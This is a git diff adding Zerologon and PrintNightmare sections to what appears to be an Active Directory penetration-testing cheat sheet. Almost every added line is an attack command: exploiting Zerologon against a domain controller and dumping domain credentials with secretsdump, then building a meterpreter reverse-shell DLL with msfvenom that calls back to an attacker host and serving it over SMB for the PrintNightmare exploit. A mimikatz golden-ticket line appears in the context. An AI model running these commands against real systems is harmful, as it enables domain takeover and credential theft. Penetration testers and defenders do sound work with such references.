@@ -139,6 +139,46 @@ kerberos::golden /User:Fakeuser /domain:<domain name> /sid:<SID> /krbtgt:<NTLM h
 misc::cmd
 ```
 # Abusing [ZeroLogon](https://github.com/dirkjanm/CVE-2020-1472)
+- Check if the target is vulnerable to [Zerologon](https://github.com/SecuraBV/CVE-2020-1472) exploit.
+```bash
+python3 zerologon_check.py <DOMAIN CONTROLLER> <IP>
+```
+- Exploiting the target domain.
+ ```bash
+python3 cve-2020-1472-exploit.py <DOMAIN CONTROLLER> <IP>
+```
+- Using **secretsdump** we can dump credentials.
+```bash
+secretsdump.py -just-dc <DOMAIN>/<DOMAIN CONTROLLER>\$@<IP>
+```
+- To restore the password over the domain controller. Run secretsdump using the dumped administrator and hash
+```bash
+secretsdump.py administrator@<IP> -hashes <hash>
+```
+- Copy the Domain Controller's Plain Text Hex from the results above.
+```bash
+python3 restorepassword.py <Domain>/DOMAIN CONTROLLER>@<DOMAIN CONTROLLER> -target-ip <IP> -hexpass <Plain Text Hex>  
+```
 
+# [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675.git) Attack
+```powershell
+rpcdump.py @<DC IP> | egrep 'MS-RPRN|MS-PAR'
 
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+Protocol: [MS-RPRN]: Print System Remote Protocol
+# DC is vulnerable
+```
+- Create a malicious DLL file using msfvenom
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 -f dll > shell.dll
+```
+- Set up Metasploit using exploit/multi/handler
+- Now, setup a file share to parse the shell.dll file
+```bash
+smbserver.py share `pwd` -smb2support
+```
+- All set, now run the exploit script.
+```bash
+python3 CVE-2021-1675.py <DC>/<user>:<Password>@<DC IP> '\\<LHOST>\share\shell.dll'
+```
 
